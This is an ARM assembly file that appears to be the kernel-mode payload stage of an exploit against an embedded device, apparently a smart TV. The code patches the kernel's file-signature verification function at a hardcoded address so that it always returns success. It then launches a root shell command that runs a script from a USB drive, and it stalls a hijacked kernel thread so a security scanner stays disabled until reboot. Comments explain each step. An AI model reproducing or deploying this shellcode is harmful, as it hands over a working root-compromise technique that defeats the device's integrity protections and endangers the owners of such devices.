.syntax unified
.arm
.global _start
_start:
    ldr sp, [sp]              @ sp was 0xc0008d00: load the live memcpy r1
    sub sp, sp, #0x400        @ stay inside this task's 8 KiB kernel stack

    @ Kant UEP neutraliser: SfdUepVerifyFileSignature(0xc0211c70)
    @ -> mov r0, #2 ; bx lr ; then flush the 8 patched bytes.
    ldr r0, uep_lit
    ldr r1, uep_w0_lit
    str r1, [r0]
    ldr r1, uep_w1_lit
    str r1, [r0, #4]
    add r1, r0, #8
    ldr r3, [pc, #-44]        @ stage0's coherent word at blob+128 (0xc001bfbc)
    blx r3

    @ argv on the stack: {"/bin/sh", "-c", cmd, NULL}
    adr r0, path
    adr r1, argc
    adr r2, cmd
    eor r3, r3, r3
    add r4, sp, #16
    stmia r4, {r0-r3}
    mov r1, r4
    mov r2, #0
    ldr r4, umh_lit
    blx r4

    @ Park this readdir thread instead of burning a core: sleep 250 jiffies
    @ (1 s at 250 Hz) and repeat.  It still holds p1's inode mutex, so the
    @ scanner stays dead until reboot, but CPU time stops accumulating.
1:  ldr r4, park_lit
    mov r0, #250
    blx r4
    b 1b

umh_lit: .word 0xc00389c4
uep_lit: .word 0xc0211c70
uep_w0_lit: .word 0xe3a00002
uep_w1_lit: .word 0xe12fff1e
park_lit: .word 0xc0506f44
path: .asciz "/bin/sh"
argc: .asciz "-c"
cmd:  .asciz "sh</opt/media/USBDriveA2/s"
    .balign 4, 0x41
